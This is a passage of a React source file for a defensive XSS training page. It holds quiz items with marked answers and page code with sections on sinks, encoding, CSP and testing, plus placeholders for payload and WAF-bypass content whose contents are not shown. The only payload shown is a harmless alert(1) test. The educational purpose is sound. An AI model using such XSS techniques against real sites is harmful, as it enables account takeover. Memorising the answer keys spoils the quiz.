    id: 43,
    topic: "DOM",
    question: "Writing location.hash directly to innerHTML is:",
    options: ["A DOM XSS vulnerability", "Always safe", "Only a logging issue", "Required for routing"],
    correctAnswer: 0,
    explanation: "location.hash is attacker-controlled.",
  },
  {
    id: 44,
    topic: "DOM",
    question: "Using textContent with location.hash is:",
    options: ["Safer than innerHTML", "More dangerous", "Equivalent to eval", "A CSP violation"],
    correctAnswer: 0,
    explanation: "textContent treats input as text.",
  },
  {
    id: 45,
    topic: "DOM",
    question: "setTimeout(userInput) is risky because it:",
    options: ["Evaluates input as code", "Encodes input", "Prevents execution", "Blocks scripts"],
    correctAnswer: 0,
    explanation: "setTimeout with strings behaves like eval.",
  },
  {
    id: 46,
    topic: "DOM",
    question: "new Function(userInput) is risky because it:",
    options: ["Compiles and executes attacker input", "Escapes automatically", "Is ignored by browsers", "Only logs input"],
    correctAnswer: 0,
    explanation: "new Function executes provided code.",
  },
  {
    id: 47,
    topic: "Defense",
    question: "A WAF is:",
    options: ["A helpful layer but not a full fix", "A complete XSS solution", "A replacement for encoding", "Not useful at all"],
    correctAnswer: 0,
    explanation: "WAFs help but cannot replace secure coding.",
  },
  {
    id: 48,
    topic: "Defense",
    question: "Security testing for XSS should include:",
    options: ["Manual and automated testing", "Only unit tests", "Only code review", "Only penetration tests"],
    correctAnswer: 0,
    explanation: "A mix of testing approaches works best.",
  },
  {
    id: 49,
    topic: "Defense",
    question: "A good output encoding library should:",
    options: ["Be context-aware", "Only support HTML", "Avoid updates", "Be custom and untested"],
    correctAnswer: 0,
    explanation: "Libraries should support multiple contexts safely.",
  },
  {
    id: 50,
    topic: "Defense",
    question: "Context-aware encoding means:",
    options: ["Different encoding for HTML, JS, URL, CSS", "One encoding for all outputs", "Only input encoding", "No encoding needed"],
    correctAnswer: 0,
    explanation: "Each context needs a specific encoding.",
  },
  {
    id: 51,
    topic: "XSS vs Other",
    question: "XSS differs from CSRF because XSS:",
    options: ["Runs attacker script in the victim browser", "Only sends requests without scripts", "Only affects servers", "Requires no user interaction"],
    correctAnswer: 0,
    explanation: "CSRF is request forgery; XSS is script injection.",
  },
  {
    id: 52,
    topic: "XSS vs Other",
    question: "JSONP is risky because it:",
    options: ["Executes JSON as script", "Encrypts responses", "Blocks scripts", "Requires CSP"],
    correctAnswer: 0,
    explanation: "JSONP uses script tags, enabling XSS.",
  },
  {
    id: 53,
    topic: "XSS vs Other",
    question: "Using innerText is generally:",
    options: ["Safer for untrusted text", "More dangerous than innerHTML", "Equivalent to eval", "Only for CSS"],
    correctAnswer: 0,
    explanation: "innerText does not parse HTML.",
  },
  {
    id: 54,
    topic: "XSS vs Other",
    question: "Using setAttribute with untrusted URL is risky because:",
    options: ["It can allow javascript: URLs", "It always encodes", "It blocks navigation", "It prevents XSS"],
    correctAnswer: 0,
    explanation: "URL schemes must be validated.",
  },
  {
    id: 55,
    topic: "Testing",
    question: "A safe way to test for XSS is to use:",
    options: ["Non-destructive payloads like alert(1)", "Real credential theft", "Phishing pages", "Malware"],
    correctAnswer: 0,
    explanation: "Testing should be safe and controlled.",
  },
  {
    id: 56,
    topic: "Testing",
    question: "When testing reflected XSS, you often look for:",
    options: ["Unsafely reflected input in responses", "Stored comments only", "DB corruption", "DNS changes"],
    correctAnswer: 0,
    explanation: "Reflected input in HTML can execute scripts.",
  },
  {
    id: 57,
    topic: "Testing",
    question: "When testing stored XSS, you often look for:",
    options: ["Payloads saved and shown to other users", "Only query parameters", "Only headers", "Only redirects"],
    correctAnswer: 0,
    explanation: "Stored payloads persist and execute later.",
  },
  {
    id: 58,
    topic: "Testing",
    question: "When testing DOM XSS, you focus on:",
    options: ["Client-side sources and sinks", "Server logs only", "Database queries only", "TLS settings only"],
    correctAnswer: 0,
    explanation: "DOM XSS happens in JavaScript.",
  },
  {
    id: 59,
    topic: "Mitigation",
    question: "A secure CSP often sets object-src to:",
    options: ["none", "self", "unsafe-inline", "data"],
    correctAnswer: 0,
    explanation: "object-src none blocks plugins and risky content.",
  },
  {
    id: 60,
    topic: "Mitigation",
    question: "Using strict-dynamic in CSP:",
    options: ["Allows trusted scripts to load others", "Disables all scripts", "Removes nonces", "Enables unsafe-inline"],
    correctAnswer: 0,
    explanation: "strict-dynamic trusts scripts with a nonce or hash.",
  },
  {
    id: 61,
    topic: "Data Handling",
    question: "Sanitization should be done:",
    options: ["Before inserting HTML into the DOM", "Only at input time", "Only in the database", "Only after rendering"],
    correctAnswer: 0,
    explanation: "Sanitize before any HTML insertion.",
  },
  {
    id: 62,
    topic: "Data Handling",
    question: "Allowing users to upload HTML content requires:",
    options: ["Strict sanitization and review", "No controls", "Only encryption", "Disabling CSP"],
    correctAnswer: 0,
    explanation: "User HTML is risky without sanitization.",
  },
  {
    id: 63,
    topic: "Data Handling",
    question: "Escaping should be applied:",
    options: ["Every time data is rendered", "Only once when saved", "Only in logs", "Only in CSS"],
    correctAnswer: 0,
    explanation: "Encoding should be applied at each render.",
  },
  {
    id: 64,
    topic: "Defense",
    question: "A defense-in-depth approach includes:",
    options: ["Encoding, sanitization, and CSP", "Only logging", "Only encryption", "Only WAFs"],
    correctAnswer: 0,
    explanation: "Combine multiple layers for best protection.",
  },
  {
    id: 65,
    topic: "Defense",
    question: "Trusted Types can help by:",
    options: ["Restricting DOM sinks to safe values", "Disabling all scripts", "Replacing CSP", "Removing sanitization"],
    correctAnswer: 0,
    explanation: "Trusted Types reduce DOM XSS in modern browsers.",
  },
  {
    id: 66,
    topic: "Defense",
    question: "Avoiding inline scripts helps because:",
    options: ["It enables stricter CSP", "It disables cookies", "It removes HTML", "It forces eval"],
    correctAnswer: 0,
    explanation: "Strict CSP is easier without inline scripts.",
  },
  {
    id: 67,
    topic: "Defense",
    question: "Using template literals with untrusted input can:",
    options: ["Introduce XSS if inserted into HTML", "Prevent injection", "Encrypt data", "Disable scripts"],
    correctAnswer: 0,
    explanation: "Templates do not sanitize automatically.",
  },
  {
    id: 68,
    topic: "Defense",
    question: "Escaping for CSS context should:",
    options: ["Use CSS-specific escaping", "Use HTML escaping only", "Use URL encoding only", "Be skipped"],
    correctAnswer: 0,
    explanation: "CSS context requires CSS escaping.",
  },
  {
    id: 69,
    topic: "Defense",
    question: "Escaping for URL context should:",
    options: ["Validate scheme and encode components", "Only escape HTML", "Ignore protocol", "Always allow javascript:"],
    correctAnswer: 0,
    explanation: "Validate schemes and encode safely.",
  },
  {
    id: 70,
    topic: "Defense",
    question: "XSS in JSON responses can be avoided by:",
    options: ["Setting correct Content-Type and not executing JSON", "Wrapping JSON in script tags", "Using JSONP", "Disabling CSP"],
    correctAnswer: 0,
    explanation: "Serve JSON with application/json and parse safely.",
  },
  {
    id: 71,
    topic: "Defense",
    question: "If you must render HTML from users, you should:",
    options: ["Sanitize and allowlist tags and attributes", "Trust input", "Disable all checks", "Only escape once"],
    correctAnswer: 0,
    explanation: "Allowlist-based sanitization is required.",
  },
  {
    id: 72,
    topic: "Defense",
    question: "Browser auto-escaping features are:",
    options: ["Not a replacement for proper encoding", "Always sufficient", "Guaranteed protection", "A CSP substitute"],
    correctAnswer: 0,
    explanation: "Do not rely on browser heuristics.",
  },
  {
    id: 73,
    topic: "Detection",
    question: "XSS detection in logs can include:",
    options: ["Suspicious tags or event handlers in input", "Only normal requests", "Only status codes", "Only TLS errors"],
    correctAnswer: 0,
    explanation: "Look for script-like payloads in input.",
  },
  {
    id: 74,
    topic: "Detection",
    question: "A CSP violation report can help:",
    options: ["Identify attempted script execution", "Encrypt responses", "Disable logging", "Remove HTML"],
    correctAnswer: 0,
    explanation: "Reports show blocked script sources.",
  },
  {
    id: 75,
    topic: "Summary",
    question: "The safest approach to prevent XSS is:",
    options: ["Context-aware output encoding plus CSP", "Only input validation", "Only WAF rules", "Only logging"],
    correctAnswer: 0,
    explanation: "Encoding and strong CSP provide robust protection.",
  },
];

const ACCENT_COLOR = "#f59e0b";

export default function XSSGuidePage() {
  const navigate = useNavigate();
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("lg"));

  // Navigation State
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState("");

  const pageContext = `Cross-Site Scripting (XSS) Guide - Covers reflected, stored, and DOM-based XSS types, attack flow, entry points, sources and sinks, context-aware encoding, detection signals, safe testing checklist, prevention layers, CSP guidance, response steps, framework-safe patterns, real-world case studies, and tooling.`;

  // Section Navigation Items
  const sectionNavItems = [
    { id: "intro", label: "Introduction", icon: <SchoolIcon /> },
    { id: "overview", label: "What is XSS?", icon: <WebIcon /> },
    { id: "how-xss-works", label: "How XSS Works", icon: <SecurityIcon /> },
    { id: "xss-types", label: "XSS Types", icon: <CategoryIcon /> },
    { id: "encoding", label: "Context Encoding", icon: <CodeIcon /> },
    { id: "payloads", label: "Common Payloads", icon: <BugReportIcon /> },
    { id: "sinks", label: "Dangerous Sinks", icon: <WarningIcon /> },
    { id: "detection", label: "Detection & Testing", icon: <SearchIcon /> },
    { id: "prevention", label: "Prevention", icon: <ShieldIcon /> },
    { id: "advanced", label: "Advanced Techniques", icon: <TerminalIcon /> },
    { id: "waf-bypass", label: "WAF Bypass", icon: <BuildIcon /> },
    { id: "case-studies", label: "Case Studies", icon: <HistoryIcon /> },
    { id: "tools", label: "Testing Tools", icon: <BuildIcon /> },
    { id: "quiz-section", label: "Quiz", icon: <QuizIcon /> },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      let currentSection = "";

      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  const currentIndex = sectionNavItems.findIndex((item) => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / sectionNavItems.length) * 100 : 0;

  // Sidebar Navigation Component
  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 220,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 3,
        border: `1px solid ${alpha(ACCENT_COLOR, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        display: { xs: "none", lg: "block" },
        "&::-webkit-scrollbar": { width: 6 },
        "&::-webkit-scrollbar-thumb": { bgcolor: alpha(ACCENT_COLOR, 0.3), borderRadius: 3 },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Typography
          variant="subtitle2"
          sx={{ fontWeight: 700, mb: 1, color: ACCENT_COLOR, display: "flex", alignItems: "center", gap: 1 }}
        >
          <ListAltIcon sx={{ fontSize: 18 }} />
          Course Navigation
        </Typography>
        <Box sx={{ mb: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">Progress</Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: ACCENT_COLOR }}>
              {Math.round(progressPercent)}%
            </Typography>
          </Box>
          <LinearProgress
            variant="determinate"
            value={progressPercent}
            sx={{
              height: 6,
              borderRadius: 3,
              bgcolor: alpha(ACCENT_COLOR, 0.1),
              "& .MuiLinearProgress-bar": { bgcolor: ACCENT_COLOR, borderRadius: 3 },
            }}
          />
        </Box>
        <Divider sx={{ mb: 1 }} />
        <List dense sx={{ mx: -1 }}>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1.5,
                mb: 0.25,
                py: 0.5,
                cursor: "pointer",
                bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.15) : "transparent",
                borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : "3px solid transparent",
                "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.08) },
                transition: "all 0.15s ease",
              }}
            >
              <ListItemIcon sx={{ minWidth: 24, fontSize: "0.9rem" }}>{item.icon}</ListItemIcon>
              <ListItemText
                primary={
                  <Typography
                    variant="caption"
                    sx={{
                      fontWeight: activeSection === item.id ? 700 : 500,
                      color: activeSection === item.id ? ACCENT_COLOR : "text.secondary",
                    }}
                  >
                    {item.label}
                  </Typography>
                }
              />
            </ListItem>
          ))}
        </List>
      </Box>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="Cross-Site Scripting (XSS)" pageContext={pageContext}>
      {/* Floating Navigation Button - Mobile Only */}
      <Tooltip title="Navigate Sections" placement="left">
        <Fab
          color="primary"
          onClick={() => setNavDrawerOpen(true)}
          sx={{
            position: "fixed",
            bottom: 90,
            right: 24,
            zIndex: 1000,
            bgcolor: ACCENT_COLOR,
            "&:hover": { bgcolor: "#d97706" },
            boxShadow: `0 4px 20px ${alpha(ACCENT_COLOR, 0.4)}`,
            display: { xs: "flex", lg: "none" },
          }}
        >
          <ListAltIcon />
        </Fab>
      </Tooltip>

      {/* Scroll to Top Button - Mobile Only */}
      <Tooltip title="Scroll to Top" placement="left">
        <Fab
          size="small"
          onClick={scrollToTop}
          sx={{
            position: "fixed",
            bottom: 32,
            right: 28,
            zIndex: 1000,
            bgcolor: alpha(ACCENT_COLOR, 0.15),
            color: ACCENT_COLOR,
            "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.25) },
            display: { xs: "flex", lg: "none" },
          }}
        >
          <KeyboardArrowUpIcon />
        </Fab>
      </Tooltip>

      {/* Navigation Drawer - Mobile */}
      <Drawer
        anchor="right"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        PaperProps={{
          sx: {
            width: isMobile ? "85%" : 320,
            bgcolor: theme.palette.background.paper,
            backgroundImage: "none",
          },
        }}
      >
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
              <ListAltIcon sx={{ color: ACCENT_COLOR }} />
              Course Navigation
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} size="small">
              <CloseIcon />
            </IconButton>
          </Box>

          <Divider sx={{ mb: 2 }} />

          <Box sx={{ mb: 2, p: 1.5, borderRadius: 2, bgcolor: alpha(ACCENT_COLOR, 0.05) }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
              <Typography variant="caption" color="text.secondary">Progress</Typography>
              <Typography variant="caption" sx={{ fontWeight: 600, color: ACCENT_COLOR }}>
                {Math.round(progressPercent)}%
              </Typography>
            </Box>
            <LinearProgress
              variant="determinate"
              value={progressPercent}
              sx={{
                height: 6,
                borderRadius: 3,
                bgcolor: alpha(ACCENT_COLOR, 0.1),
                "& .MuiLinearProgress-bar": { bgcolor: ACCENT_COLOR, borderRadius: 3 },
              }}
            />
          </Box>

          <List dense sx={{ mx: -1 }}>
            {sectionNavItems.map((item) => (
              <ListItem
                key={item.id}
                onClick={() => scrollToSection(item.id)}
                sx={{
                  borderRadius: 2,
                  mb: 0.5,
                  cursor: "pointer",
                  bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.15) : "transparent",
                  borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : "3px solid transparent",
                  "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.1) },
                  transition: "all 0.2s ease",
                }}
              >
                <ListItemIcon sx={{ minWidth: 32, fontSize: "1.1rem" }}>{item.icon}</ListItemIcon>
                <ListItemText
                  primary={
                    <Typography
                      variant="body2"
                      sx={{
                        fontWeight: activeSection === item.id ? 700 : 500,
                        color: activeSection === item.id ? ACCENT_COLOR : "text.primary",
                      }}
                    >
                      {item.label}
                    </Typography>
                  }
                />
                {activeSection === item.id && (
                  <Chip
                    label="Current"
                    size="small"
                    sx={{ height: 20, fontSize: "0.65rem", bgcolor: alpha(ACCENT_COLOR, 0.2), color: ACCENT_COLOR }}
                  />
                )}
              </ListItem>
            ))}
          </List>

          <Divider sx={{ my: 2 }} />

          <Box sx={{ display: "flex", gap: 1 }}>
            <Button
              size="small"
              variant="outlined"
              onClick={scrollToTop}
              startIcon={<KeyboardArrowUpIcon />}
              sx={{ flex: 1, borderColor: alpha(ACCENT_COLOR, 0.3), color: ACCENT_COLOR }}
            >
              Top
            </Button>
            <Button
              size="small"
              variant="outlined"
              onClick={() => scrollToSection("quiz-section")}
              startIcon={<QuizIcon />}
              sx={{ flex: 1, borderColor: alpha(ACCENT_COLOR, 0.3), color: ACCENT_COLOR }}
            >
              Quiz
            </Button>
          </Box>
        </Box>
      </Drawer>

      <Box sx={{ display: "flex", gap: 3, maxWidth: 1400, mx: "auto", px: { xs: 2, sm: 3 }, py: 4 }}>
        {sidebarNav}

        <Box sx={{ flex: 1, minWidth: 0 }}>
          {/* Header */}
          <Box id="intro" sx={{ mb: 4 }}>
            <Chip
              component={Link}
              to="/learn"
              icon={<ArrowBackIcon />}
              label="Back to Learning Hub"
              clickable
              variant="outlined"
              sx={{ borderRadius: 2, mb: 2 }}
            />
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
            <Box
              sx={{
                width: 64,
                height: 64,
                borderRadius: 2,
                bgcolor: alpha("#f59e0b", 0.1),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <CodeIcon sx={{ fontSize: 36, color: "#f59e0b" }} />
            </Box>
            <Box>
              <Typography variant="h4" sx={{ fontWeight: 800 }}>
                Cross-Site Scripting (XSS)
              </Typography>
              <Typography variant="body1" color="text.secondary">
                Client-Side Code Injection
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ maxWidth: 720, mt: 0.5, lineHeight: 1.7 }}>
                This guide explains how XSS happens, where it hides in modern apps, and how to prevent it with context-aware encoding,
                safe DOM patterns, and defense-in-depth controls like CSP and Trusted Types.
              </Typography>
            </Box>
          </Box>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip label="Web Security" color="warning" size="small" />
            <Chip label="OWASP A03" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.1), color: "#f59e0b" }} />
            <Chip label="Client-Side" size="small" sx={{ bgcolor: alpha("#8b5cf6", 0.1), color: "#8b5cf6" }} />
          </Box>
        </Box>

        {/* Overview */}
        <Paper id="overview" sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WebIcon color="warning" /> What is XSS?
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ lineHeight: 1.8 }}>
            Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other 
            users. The victim's browser executes the script in the context of the vulnerable site, enabling session 
            hijacking, data theft, and account takeover.
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mt: 2, lineHeight: 1.8 }}>
            XSS is not about breaking servers. It is about tricking the browser into treating untrusted data as executable code. Because the
            script runs under the vulnerable site's origin, it can read sensitive DOM data, call APIs, and perform actions the user can perform.
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mt: 2, lineHeight: 1.8 }}>
            Most XSS bugs come from a mismatch between input, output context, and encoding. When data is inserted into HTML, attributes, URLs,
            or inline scripts without the right encoding, it becomes a code path.
          </Typography>
          <Typography variant="subtitle2" sx={{ fontWeight: 700, mt: 2, mb: 1 }}>
            Why teams miss XSS
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.8 }}>
            The same data can be safe in one context and unsafe in another. XSS often appears in edge UI flows like previews, error messages,
            and admin tooling where trust boundaries are weaker and tests are thin.
          </Typography>
        </Paper>

        {/* How XSS Happens */}
        <Grid id="how-xss-works" container spacing={3} sx={{ mb: 4 }}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <SecurityIcon sx={{ color: "#f59e0b" }} /> How XSS Works (Step-by-Step)
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                XSS is a data flow problem: a string that should be treated as data is instead parsed as code. The steps
                below highlight where that trust boundary is crossed.
              </Typography>
              <List dense>
                {xssFlow.map((step) => (
                  <ListItem key={step} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#f59e0b" }} />
                    </ListItemIcon>
                    <ListItemText primary={step} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <SearchIcon sx={{ color: "#8b5cf6" }} /> Common Entry Points
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                These inputs often look harmless because they are meant for display. Treat them as untrusted unless
                they are generated by the application and kept server-side.
              </Typography>
              <List dense>
                {entryPoints.map((item) => (
                  <ListItem key={item} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#8b5cf6" }} />
                    </ListItemIcon>
                    <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
        </Grid>

        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#f59e0b", 0.04) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
            High-Risk Features to Review
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            If a feature accepts user input and later renders it for another user, it should be treated as high risk.
            These are the places where XSS shows up most often in real systems.
          </Typography>
          <Grid container spacing={1}>
            {highRiskFeatures.map((item) => (
              <Grid item xs={12} sm={6} key={item}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <WarningIcon sx={{ fontSize: 16, color: "#f59e0b" }} />
                  <Typography variant="body2">{item}</Typography>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Sources and Sinks */}
        <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
          Sources are untrusted entry points. Sinks are the APIs that interpret data as HTML or code. XSS happens when
          untrusted sources flow into dangerous sinks without the right controls.
        </Typography>
        <Grid container spacing={3} sx={{ mb: 4 }}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#3b82f6", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <SearchIcon sx={{ color: "#3b82f6" }} /> Untrusted Sources
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                Any data that originated from a user, another tenant, or a third-party system should be treated as untrusted.
                Even data stored in your own database can be attacker-controlled.
              </Typography>
              <List dense>
                {domSources.map((s, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <WarningIcon sx={{ fontSize: 16, color: "#3b82f6" }} />
                    </ListItemIcon>
                    <ListItemText primary={s} primaryTypographyProps={{ variant: "body2", fontFamily: "monospace", fontSize: "0.8rem" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#8b5cf6", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <WarningIcon sx={{ color: "#8b5cf6" }} /> Safer DOM Practices
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                When you need to update the DOM, prefer APIs that treat content as text, and sanitize when HTML is required.
                Make the safe path the default in your codebase.
              </Typography>
              <List dense>
                {safeDomPractices.map((s, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#8b5cf6" }} />
                    </ListItemIcon>
                    <ListItemText primary={s} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
        </Grid>

        {/* XSS Types */}
        <Typography id="xss-types" variant="h5" sx={{ fontWeight: 700, mb: 3 }}>🎯 XSS Types</Typography>
        <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
          The three main XSS families differ by where the payload lives and how it reaches the browser. Understanding
          the source and lifecycle of the payload helps you choose the correct fix.
        </Typography>
        <Grid container spacing={2} sx={{ mb: 4 }}>
          {xssTypes.map((type) => (
            <Grid item xs={12} md={4} key={type.title}>
              <Paper
                sx={{
                  p: 2,
                  height: "100%",
                  borderRadius: 2,
                  border: `1px solid ${alpha(type.color, 0.2)}`,
                  "&:hover": { borderColor: type.color },
                }}
              >
                <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 1 }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: type.color }}>
                    {type.title}
                  </Typography>
                  <Chip label={type.persistence} size="small" sx={{ fontSize: "0.65rem", height: 20 }} />
                </Box>
                <Typography variant="body2" color="text.secondary">
                  {type.description}
                </Typography>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* Context-Aware Encoding */}
        <Paper id="encoding" sx={{ p: 3, mb: 4, borderRadius: 3 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
            Context-Aware Encoding Cheat Sheet
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
            The safe fix depends on where the data is placed. Always encode for the correct context.
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Encoding is an output decision, not an input decision. Input validation helps reduce noise, but it is not
            sufficient on its own. Make sure the rendering layer is responsible for proper encoding every time.
          </Typography>
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ fontWeight: 700 }}>Context</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Risk</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Safer Handling</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {encodingContexts.map((row) => (
                  <TableRow key={row.context}>
                    <TableCell sx={{ fontWeight: 600 }}>{row.context}</TableCell>
                    <TableCell>{row.risk}</TableCell>
                    <TableCell>{row.safe}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        </Paper>

        {/* Common Payloads */}
        <Paper
          id="payloads"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            background: `linear-gradient(135deg, ${alpha("#f59e0b", 0.05)}, ${alpha("#ef4444", 0.05)})`,
            border: `1px solid ${alpha("#f59e0b", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <BugReportIcon sx={{ color: "#f59e0b" }} /> Common Payloads
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
            Use these only in authorized environments. They help identify the context (HTML, attribute, URL) and confirm
            whether encoding or sanitization is working as expected.
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
            Keep tests non-destructive. Simple alerts or harmless DOM markers are enough to confirm a vulnerability
            without touching real user data or sessions.
          </Typography>
          <Grid container spacing={1}>
            {commonPayloads.map((p, i) => (
              <Grid item xs={12} sm={6} key={i}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <Box sx={{ p: 0.5, px: 1, bgcolor: alpha("#f59e0b", 0.1), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem", flexShrink: 0 }}>
                    {p.payload}
                  </Box>
                  <Typography variant="caption" color="text.secondary">{p.context}</Typography>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Dangerous Sinks & Impact */}
        <Grid id="sinks" container spacing={3} sx={{ mb: 4 }}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#8b5cf6", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <WarningIcon sx={{ color: "#8b5cf6" }} /> Dangerous Sinks (DOM XSS)
              </Typography>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
                Sinks are the APIs that turn strings into executable markup or code. Audit these carefully, especially
                when the value can be influenced by users or third-party data.
              </Typography>
              <List dense>
                {dangerousSinks.map((s, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <WarningIcon sx={{ fontSize: 16, color: "#8b5cf6" }} />
                    </ListItemIcon>
